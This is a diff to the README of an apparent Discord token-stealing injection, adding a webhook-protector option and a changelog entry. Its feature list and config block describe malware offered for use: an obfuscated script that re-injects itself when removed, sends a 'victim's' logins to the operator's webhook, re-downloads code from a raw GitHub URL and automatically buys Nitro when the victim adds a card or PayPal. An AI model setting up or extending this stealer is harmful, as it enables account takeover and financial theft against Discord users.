@@ -44,6 +44,7 @@ Love ❌ code ✅
 
 ✔ Customizable \
 ✔ Obfuscated (not advanced but the best it can go cuz of string replacement) \
+✔ Works with [Discord-Webhook-Protector](https://github.com/Rdimo/Discord-Webhook-Protector) \
 ✔ If Injection got removed it injects again! \
 ✔ Works on both Windows and Darwin! \
 ✔ Auto buy nitro! (toggleable) \
@@ -79,13 +80,13 @@ Copy the raw url of the [injection](./injection.js) and then paste it in your co
 
 ```javascript
 const config = {
+    webhook: '%WEBHOOK%', //your discord webhook there obviously or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
     auto_buy_nitro: true, //automatically buys nitro when the victim adds credit card or paypal account or tries to buy nitro themselves
     ping_on_run: false, //sends whatever value you have in ping_val when you get a run/login
     ping_val: '@everyone', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
     embed_name: 'Discord Injection', //name of the webhook thats gonna send the info
     embed_icon: 'https://raw.githubusercontent.com/Rdimo/images/master/Discord-Injection/discord atom.png'.replace(/ /g,'%20'), //icon for the webhook thats gonna send the info
     embed_color: 8363488, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-    webhook: '%WEBHOOK%', //your discord webhook there obviously
     injection_url: 'https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js', //injection url for when it reinjects
 
     ... //rest of the config you should NOT touch
@@ -155,6 +156,10 @@ This project is licensed under the GNU General Public License v3.0 License - see
 ## 💭・ChangeLog
 
 ```diff
+v0.1.4 ⋮ 2022-05-22
++ Added support for https://github.com/Rdimo/Discord-Webhook-Protector
++ Additionaly formatting
+
 v0.1.3 ⋮ 2022-05-22
 + Bug fixes + cleaner code
 
